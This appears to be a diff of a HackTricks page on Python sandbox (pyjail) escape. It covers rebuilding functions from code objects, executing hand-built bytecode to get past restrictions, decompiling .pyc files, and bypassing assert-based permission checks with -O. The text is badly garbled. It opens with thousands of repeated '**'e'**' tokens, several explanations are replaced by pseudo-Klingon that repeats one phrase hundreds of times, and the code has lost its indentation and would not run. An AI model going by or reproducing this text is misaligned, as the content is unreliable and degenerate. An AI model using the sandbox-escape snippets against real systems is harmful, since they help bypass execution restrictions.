**'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
 code_obj = code_type(co_argcount, co_kwonlyargcount,
-               co_nlocals, co_stacksize, co_flags,
-               co_code, co_consts, co_names,
-               co_varnames, co_filename, co_name,
-               co_firstlineno, co_lnotab, freevars=None, 
-               cellvars=None)
+co_nlocals, co_stacksize, co_flags,
+co_code, co_consts, co_names,
+co_varnames, co_filename, co_name,
+co_firstlineno, co_lnotab, freevars=None,
+cellvars=None)
 
 # Execution
 eval(code_obj) #Execute as a whole script
@@ -1032,10 +1133,8 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
-
 {% hint style="info" %}
-Depending on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
-
+DependIng on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
 ```
 import types
 types.CodeType.__doc__
@@ -1043,12 +1142,11 @@ types.CodeType.__doc__
 ```
 {% endhint %}
 
-### Recreating a leaked function
+### qo'noS le' vItlhutlh
 
 {% hint style="warning" %}
-In the following example, we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
+vaj qatlh example, maHegh data vItlhutlh function vItlhutlh function code object directly. **real example** vaj **values** execute function **`code_type`** **leak** **you will need to**.
 {% endhint %}
-
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -1059,18 +1157,16 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-
 ### Bypass Defenses
 
 In previous examples at the beginning of this post, you can see **how to execute any python code using the `compile` function**. This is interesting because you can **execute whole scripts** with loops and everything in a **one liner** (and we could do the same using **`exec`**).\
 Anyway, sometimes it could be useful to **create** a **compiled object** in a local machine and execute it in the **CTF machine** (for example because we don't have the `compiled` function in the CTF).
 
 For example, let's compile and execute manually a function that reads _./poc.py_:
-
 ```python
 #Locally
 def read():
-    return open("./poc.py",'r').read()
+return open("./poc.py",'r').read()
 
 read.__code__.co_code
 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
@@ -1093,9 +1189,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-
-If you cannot access `eval` or `exec` you could create a **proper function**, but calling it directly is usually going to fail with: _constructor not accessible in restricted mode_. So you need a **function not in the restricted environment to call this function.**
-
+**ghItlhvam** `eval` **je** `exec` **ghaHbe'chugh**, **ghobe'** **ghItlhvam** **tlhIngan** **ghItlhvam**, **'ach** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlhvam** **qar'a'** **ghItlh
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1103,12 +1197,11 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
+## ʼIw HIq
 
-## Decompiling Compiled Python
+[**https://www.decompiler.com/**](https://www.decompiler.com) **ghItlh** **decompile** compiled python code.
 
-Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com) one can **decompile** given compiled python code.
-
-**Check out this tutorial**:
+**tutorial vItlhutlh**:
 
 {% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
 [.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
@@ -1120,18 +1213,14 @@ Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com) o
 
 Python executed with optimizations with the param `-O` will remove asset statements and any code conditional on the value of **debug**.\
 Therefore, checks like
-
 ```python
 def check_permission(super_user):
-    try:
-        assert(super_user)
-        print("\nYou are a super user\n")
-    except AssertionError:
-        print(f"\nNot a Super User!!!\n")
+try:
+assert(super_user)
+print("\nYou are a super user\n")
+except AssertionError:
+print(f"\nNot a Super User!!!\n")
 ```
-
-will be bypassed
-
 ## References
 
 * [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
@@ -1163,4 +1252,3 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
